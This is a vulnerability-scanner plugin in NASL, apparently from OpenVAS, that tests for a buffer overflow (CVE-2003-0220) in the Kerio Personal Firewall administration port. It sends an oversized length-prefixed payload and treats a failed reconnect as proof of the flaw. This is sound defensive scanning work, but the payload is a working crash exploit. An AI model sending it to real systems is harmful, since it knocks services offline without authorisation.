# SPDX-FileCopyrightText: 2003 Michel Arboi
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11575");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_cve_id("CVE-2003-0220");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/7180");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Kerio Personal Firewall Buffer Overflow");
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_copyright("Copyright (C) 2003 Michel Arboi");
  script_family("Buffer overflow");
  script_dependencies("kerio_firewall_admin_port.nasl");
  script_require_ports("Services/kerio", 44334);
  script_mandatory_keys("kpf_admin_port/detected");

  script_tag(name:"solution", value:"Upgrade your personal firewall.");

  script_tag(name:"summary", value:"Kerio Personal Firewall is vulnerable to a buffer overflow
  on the administration port.");

  script_tag(name:"impact", value:"An attacker may use this to crash Kerio or worse, execute arbitrary
  code on the system.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("misc_func.inc");
include("port_service_func.inc");

port = service_get_port( default:44334, proto:"kerio" );

soc = open_sock_tcp( port );
if( ! soc )
  exit( 0 );

b = recv( socket:soc, length:10 );
b = recv( socket:soc, length:256 );

expl = raw_string( 0x00, 0x00, 0x14, 0x9C );
expl += crap( 0x149c );
send( socket:soc, data:expl );
close( soc );

soc = open_sock_tcp( port );
if( ! soc ) {
  security_message( port:port );
  exit( 0 );
}

close( soc );
exit( 99 );
